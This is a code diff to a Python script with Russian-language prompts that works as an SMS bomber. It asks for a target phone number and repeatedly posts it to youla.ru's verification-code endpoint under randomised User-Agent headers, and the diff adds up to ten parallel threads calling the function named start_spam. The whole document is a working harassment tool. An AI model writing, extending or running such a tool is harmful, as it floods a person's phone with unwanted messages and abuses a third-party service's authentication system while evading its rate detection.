@@ -1,5 +1,6 @@
 import user_agent
 import requests 
+import threading
 from time import sleep
 import random
 
@@ -8,12 +9,28 @@ import random
 def main():
     print('Введите телефончик')
     phone = parse_phone(input('>> '))
-    print()
+
+    
+    print('Сколько потоков использовать (макс. 10)')
+    threads_count = input('>> ')
+    if threads_count in ['', ' ', '0']:
+        threads_count = 1
+    try:
+        if int(threads_count) > 10:
+            threads_count = '10'
+    except ValueError:
+        threads_count = '1'
+
 
     print('Номер: ' + beaty_phone(phone))
+    print('Кол-во потоков: ' + str(threads_count))
     print('1, 2, 3...')
 
-    start_spam(phone)
+
+    for _ in range(int(threads_count)):
+        threading.Thread(target=start_spam, args=(phone,)).start()
+
+
 
 
 def beaty_phone(phone):
@@ -51,15 +68,9 @@ def start_spam(phone):
         return phone_mask
 
 
-
-    name = ''
-
     headers = {'User-Agent': user_agent.generate_user_agent()}
 
     requests.post('https://youla.ru/web-api/auth/request_code',data={'phone': phone}, headers=headers)
-
-
-
 
 
 
